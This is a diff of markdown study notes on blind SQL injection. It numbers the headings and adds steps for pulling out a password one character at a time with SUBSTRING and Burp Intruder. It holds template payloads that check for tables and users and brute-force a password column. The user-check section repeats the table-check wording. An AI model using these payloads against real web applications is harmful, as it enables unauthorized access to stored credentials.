@@ -136,11 +136,11 @@ use + sign to produce spaces in HTTP/HTTPS requests.
 
 - The below techniques are based on Blind SQLi conditional responses i.e. we need to infer our SQLi payload and customize it based on what the response we get. Like creating **true** or **false** statements and then whatever response we get based on that.
 
-### Checking Parameter Vulnerability
+### 1. Checking Parameter Vulnerability
 
 - Lets say the original query is `SELECT item_name FROM Shop WHERE item_name=something`
 - Have a basic idea or concept of what the query might be doing and then do the below stuff.
-- Check parameter vulnerabilities if any.
+- Check parameter vulnerabilities like cookies or something if any.
 - Look for server responses, any change, analyze code or something.
 
 ```sql
@@ -152,7 +152,7 @@ like check each one and if responses differ you got a SQLi vulnerability
 */
 ```
 
-### Checking Table Presence
+### 2. Checking Table Presence
 
 - For example a query has a structure like `SELECT item_name FROM Shop WHERE item_name='something'` . Now in this query lets say we want to add our own query to check if a certain table is present or not.
 - Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.
@@ -161,7 +161,7 @@ like check each one and if responses differ you got a SQLi vulnerability
 ' AND (SELECT 'a' FROM <table_name> LIMIT 1)='a'--
 ```
 
-### Checking User Presence
+### 3. Checking User Presence
 
 - For example a query has a structure like `SELECT item_name FROM Shop WHERE item_name='something'` . Now in this query lets say we want to add our own query to check if a certain table is present or not.
 - Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.
@@ -170,13 +170,20 @@ like check each one and if responses differ you got a SQLi vulnerability
 ' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' LIMIT 1)='a'--
 ```
 
-### Bruteforcing Password
+### 4. Bruteforcing Password
 
 - Below is a demo payload. When you are trying the payload might be different because it highly depends on the web app and its sql query structure. The below payload is designed keeping the `SELECT item_name FROM Shop WHERE item_name='something'` structure in mind.
 - It requires BurpSuite intruder payload insertion.
+- Also you need to increment the index value each time to find the character for each index. You need to do this to until you complete the total length of the password.`SUBSTRING(column,<increment_till_password_length>,1)` 
 
 ```sql
 ' AND (SELECT SUBSTRING(<password_column>,1,1) FROM <table_name> WHERE <username_column>='<username>')='<burp_payload>'--
+
+/*
+here for example substring(password,1,1) => gives letter s
+so next time do substring(password,2,1) 
+and next time substring(password,3,1) ... till the total length of the password.
+*/
 ```
 
 ---
